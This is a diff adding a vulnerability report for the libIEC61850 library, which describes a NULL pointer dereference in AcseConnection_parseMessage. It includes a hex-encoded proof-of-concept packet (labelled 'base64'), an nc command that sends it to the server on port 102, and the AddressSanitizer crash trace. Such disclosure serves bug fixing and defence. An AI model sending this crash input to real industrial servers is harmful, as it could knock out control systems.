@@ -1,0 +1,57 @@
+issue: #368
+NULL Pointer Dereference in AcseConnection_parseMessage
+Description
+A NULL Pointer Dereference was discovered in AcseConnection_parseMessage at src/mms/iso_acse/acse.c:429. The vulnerability causes a segmentation fault and application crash.
+
+version
+
+8eeb6f0
+
+System information
+Ubuntu 20.04 focal, AMD EPYC 7742 64-Core @ 16x 2.25GHz
+
+Proof of Concept
+poc
+
+base64 poc
+0300001602F0800D0D0100C1013181020001A2020000
+command:
+
+./server_example_basic_io
+nc 0.0.0.0 102 < poc
+Result
+
+./server_example_basic_io
+Using libIEC61850 version 1.5.0
+Connection opened
+AddressSanitizer:DEADLYSIGNAL
+=================================================================
+==4028537==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000 (pc 0x55de6e46db68 bp 0x7fac36efcaa0 sp 0x7fac36efc9f0 T3)
+==4028537==The signal is caused by a READ memory access.
+==4028537==Hint: address points to the zero page.
+    #0 0x55de6e46db67 in AcseConnection_parseMessage src/mms/iso_acse/acse.c:429
+    #1 0x55de6e41960b in IsoConnection_handleTcpConnection src/mms/iso_server/iso_connection.c:233
+    #2 0x55de6e41ac5d in handleTcpConnection src/mms/iso_server/iso_connection.c:472
+    #3 0x7fac3b7e3608 in start_thread /build/glibc-eX1tMB/glibc-2.31/nptl/pthread_create.c:477
+    #4 0x7fac3b5bb292 in __clone (/lib/x86_64-linux-gnu/libc.so.6+0x122292)
+
+AddressSanitizer can not provide additional info.
+SUMMARY: AddressSanitizer: SEGV src/mms/iso_acse/acse.c:429 in AcseConnection_parseMessage
+Thread T3 created by T1 here:
+    #0 0x7fac3b837805 in pthread_create (/lib/x86_64-linux-gnu/libasan.so.5+0x3a805)
+    #1 0x55de6e3b19dc in Thread_start hal/thread/linux/thread_linux.c:89
+    #2 0x55de6e41b4f7 in IsoConnection_start src/mms/iso_server/iso_connection.c:581
+    #3 0x55de6e417bf1 in handleIsoConnections src/mms/iso_server/iso_server.c:520
+    #4 0x55de6e417c99 in isoServerThread src/mms/iso_server/iso_server.c:554
+    #5 0x7fac3b7e3608 in start_thread /build/glibc-eX1tMB/glibc-2.31/nptl/pthread_create.c:477
+
+Thread T1 created by T0 here:
+    #0 0x7fac3b837805 in pthread_create (/lib/x86_64-linux-gnu/libasan.so.5+0x3a805)
+    #1 0x55de6e3b19dc in Thread_start hal/thread/linux/thread_linux.c:89
+    #2 0x55de6e4182d2 in IsoServer_startListening src/mms/iso_server/iso_server.c:682
+    #3 0x55de6e3b9b50 in MmsServer_startListening src/mms/iso_mms/server/mms_server.c:606
+    #4 0x55de6e3adae9 in IedServer_start src/iec61850/server/impl/ied_server.c:692
+    #5 0x55de6e39537e in main /root/disk2/fuzzing/libiec61850/test/libiec61850/examples/server_example_basic_io/server_example_basic_io.c:146
+    #6 0x7fac3b4c00b2 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x270b2)
+
+==4028537==ABORTING
